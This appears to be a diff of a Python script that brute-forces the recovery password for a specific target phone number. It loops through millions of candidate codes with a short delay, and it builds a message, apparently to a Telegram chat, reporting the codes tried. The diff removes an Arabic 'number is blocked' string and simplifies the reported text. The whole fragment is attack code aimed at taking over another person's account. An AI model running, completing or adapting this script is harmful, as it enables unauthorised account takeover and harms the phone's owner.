@@ -10,7 +10,7 @@ target_phone = "772490746"
 for i in range(9999999):
     time.sleep(0.2)
     zee = 4456190
-    ze ="الرقم محظور"
+    
     data = {
         "username": target_phone,"recoveryPassword": str(zee + i)
         
@@ -23,7 +23,7 @@ for i in range(9999999):
     
     d = {
     "chat_id": CHAT_ID,
-    "text": zee +i, "text": ze   
+    "text": zee +i 
     
 }
     if response.status_code == 200:
